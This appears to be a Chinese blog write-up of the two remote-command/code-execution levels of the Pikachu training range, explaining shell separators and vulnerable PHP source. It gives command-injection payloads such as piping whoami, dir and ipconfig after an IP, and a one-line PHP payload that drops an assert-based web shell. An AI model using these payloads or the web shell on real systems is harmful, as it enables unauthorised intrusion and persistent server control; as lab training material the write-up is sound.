---
title: pikachuRCE通关笔记
published: 2025-10-04
description: 抓包工具及证书安装。
tags: [靶场,基础入门]
category: 网络安全
draft: false
---

# pikachu-01 RCE(remote command/code execute)

# 概述

pikachu靶场的RCE远程命令执行关卡（2关）记录。

> **介绍**
> RCE远程命令/代码执行，RCE英文全称：remote command/code execute。它是一种极为严重的安全风险，允许攻击者在未授权的情况下，通过网络远程在目标系统上执行任意代码。攻击者利用 RCE安全风险，可直接获取系统的控制权，进而窃取敏感信息，如用户账号、密码、企业机密数据等；还能篡改系统文件和配置，破坏系统的正常运行，导致业务中断；甚至可以在系统中植入后门程序，长期控制目标系统，为后续的攻击活动提供便利。
>
> **远程系统命令执行**
> 一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。
>
> 现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过"自动化运维平台"进行操作。 在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,会有意想不到的"收获"-_-
>
> **远程代码执行**
> 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。你可以通过“RCE”对应的测试栏目，来进一步的了解该漏洞。

## 常用符号

在命令执行安全风险场景里，`&、&&、|、||、`; 这些符号被攻击者用于拼接命令和控制命令执行流程，以下是它们的用法和区别如下所示。

1. `&`

   作用：在多数操作系统中，`&` 用于让命令在后台执行。在命令执行安全风险里，它能使多个命令并行执行，即前一个命令启动后，后续命令无需等待其完成就会开始执行。

   示例：假设存在安全风险的系统允许用户输入并执行命令，攻击者输入 `ping 127.0.0.1 & ls`，那么 ping 命令和 ls 命令会同时开始执行。

2. `&&`

   作用：`&&` 用于按顺序依次执行命令，并且只有当前一个命令成功执行（返回状态码为 0）时，才会执行后一个命令。这常用于需要前一个操作完成且成功后再进行下一步操作的情况。

   示例：输入 `ping 127.0.0.1 && ls`，只有当 ping 命令成功执行（即能正常连接到 127.0.0.1）时，ls 命令才会执行。

3. `|`

   作用：`| `是管道符号，它把前一个命令的输出作为后一个命令的输入。攻击者可利用它将多个命令组合起来，实现复杂的数据处理和操作。

   示例：输入`ls | grep test`，ls 命令会列出当前目录下的文件和文件夹，然后将结果传递给 grep 命令，grep 会在这些结果中查找包含 "test" 的行。同理也可以进行如`ping 127.0.0.1 | whoami`此类的操作。

4. `||`

   作用：`|| `同样用于连接两个命令，不过与 `&& `相反，只有当前一个命令执行失败（返回状态码不为 0）时，才会执行后一个命令。这可用于在某个操作失败时执行备用操作。

   示例：输入 `false || ls`，由于 false 命令执行失败，所以会接着执行 ls 命令。

5. `;`

   作用：`; `用于分隔多个命令，它会依次执行这些命令，无论前一个命令执行成功与否，后续命令都会继续执行。

   示例：输入 `ping 127.0.0.1 ; ls`，先执行 ping 命令，然后不管 ping 执行结果如何，都会执行 ls 命令。

# exec-ping

## 源码分析

```php
// 初始化一个空字符串变量 $result，用于存储执行命令后的结果
$result = '';
 
// 检查是否通过 POST 方式提交了表单，并且表单中名为 'ipaddress' 的字段不为空
if (isset($_POST['submit']) && $_POST['ipaddress'] != null) {
    // 从 POST 请求中获取用户输入的 IP 地址，并将其赋值给变量 $ip
    $ip = $_POST['ipaddress'];
    // $check=explode('.', $ip);
    // 这是一段注释掉的代码，原本意图是将 IP 地址按点号 '.' 拆分成数组，
    // 然后可以对数组中的每个数字进行范围校验，
    // 例如第一位和第四位数字范围是 1 - 255，中间两位数字范围是 0 - 255
    // $check = explode('.', $ip); 
 
    // 检查当前服务器操作系统是否为 Windows 系统
    if (stristr(php_uname('s'), 'windows')) {
        // var_dump(php_uname('s')); 这是一段注释掉的代码，用于打印当前服务器操作系统名称
        // 使用 shell_exec 函数执行 Windows 系统下的 ping 命令，将用户输入的 IP 地址直接拼接到命令中
        // 并将执行结果追加到 $result 变量中
        $result .= shell_exec('ping ' . $ip);
    } else {
        // 如果服务器操作系统不是 Windows 系统，则执行 Linux 系统下的 ping 命令，
        // 并指定 ping 的次数为 4 次，同样将用户输入的 IP 地址直接拼接到命令中
        // 并将执行结果追加到 $result 变量中
        $result .= shell_exec('ping -c 4 ' . $ip);
    }
}
```

## 解决乱码

在pikachu-master\vul\rce目录中找到rce_ping.php文件，按如下代码进行修改即可解决乱码问题。

```php
if($result){
	$result = iconv("GBK", "UTF-8", $result); // 添加此行代码
	echo "<pre>{$result}</pre>";
}
```

## 正式操作

由于windows和linux有3个命令连接符是相同的`（|,||,&&）`，因此在不知道目标的具体操作系统的情况下（虽然是我自己搭建的环境，但是，假装不知道吧）。

输入payload：`127.0.0.1 | whoami`，结果如下图所示，执行完命令后，可以在页面看到已经获取到了目标的域和用户名：win-unahmjh2g8h\administrator，同时由于是administrator所以也知道了操作系统为Windows。

![alt](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/rce1.png)

输入payload：`127.0.0.1 | dir`，即可查看到当前路径和路径下的文件。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/rce2.png)

当然还有其它操作，比如输入payload：`127.0.0.1 | ipconfig`可以查看到目标的IP地址。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/rce3.png)

# exec-eval

## 源码分析

前端：name="txt"产生 POST 字段；后端：用户输入未被过滤直接传入eval()函数中。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/rce2-5.png)

## 正式操作

题目给到提交一个喜欢的字符串，所以就先随便扔点东西上去。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/rce2-1.png)

这里发现好像没什么限制，所以直接不演了，payload直接输入phpinfo();发现被执行，所以再试试能不能植入一句话木马。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/rce2-2.png)

```php
// 一句话木马投放
// payload：
fputs(fopen('shell.php','w'),'<?php assert($_POST[fin]);?>');
```

提交一句话之后，发现页面没什么变化，但是当返回靶机进行查看后，发现目录下已经多了一个shell.php的文件，遂用蚁剑进行连接，于是整个关卡到此结束。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/rce2-3.png)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/rce2-4.png)

